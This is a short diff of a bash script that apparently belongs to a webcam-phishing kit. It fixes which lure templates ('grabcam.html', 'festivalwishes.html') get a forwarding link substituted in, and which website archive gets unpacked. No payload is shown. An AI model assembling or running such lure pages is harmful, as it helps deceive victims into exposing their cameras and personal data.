@@ -118,13 +118,13 @@ netcheck() {
 replacer() {
     while true; do
     if echo $option | grep -q "1"; then
-        sed "s+forwarding_link+"$1"+g" index2.html > index2.html
-        sed "s+forwarding_link+"$1"+g" index.php > index.php
+        sed "s+forwarding_link+"$1"+g" grabcam.html > index2.html
+        sed "s+forwarding_link+"$1"+g" template.php > index.php
         break
     elif echo $option | grep -q "2"; then
-        sed "s+forwarding_link+"$1"+103" index php > index.php
-        sed "s+forwarding_link+"$1"+g" index3.html > index3.html
-        sed "s+fes_name+"$fest_name"+g" index2.html > index2.html
+        sed "s+forwarding_link+"$1"+103" template.php > index.php
+        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
+        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
         rm -rf index3.html
         break
     elif echo $option | grep -q "3"; then
@@ -551,8 +551,8 @@ $red[Join us]  ${cyan} :[https://bit.ly/3LAy80f]"
 done
 cd $cwd
 if [ -e websites.zip ]; then
-    unzip websites.zip > /dev/null 2>&1
-    rm -rf websites.zip
+    unzip website.zip > /dev/null 2>&1
+    rm -rf website.zip
 fi
 if ! [ -d $dir ]; then
     mkdir $dir
